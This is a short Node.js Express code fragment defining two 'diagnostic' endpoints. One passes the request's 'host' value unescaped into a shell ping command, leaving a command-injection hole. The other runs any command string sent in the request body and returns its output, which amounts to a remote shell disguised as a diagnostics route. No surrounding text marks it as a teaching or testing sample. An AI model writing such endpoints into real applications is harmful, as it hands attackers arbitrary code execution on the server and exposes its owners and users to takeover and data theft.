const { exec } = require('child_process');
const runner = require('node:child_process');
app.post('/diag/ping', (req, res) => {
  exec(`ping -c 1 ${req.body.host}`, (err, out) => res.send(out));
});
app.post('/diag/run', (req, res) => {
  runner.exec(req.body.command, (err, out) => res.send(out));
});
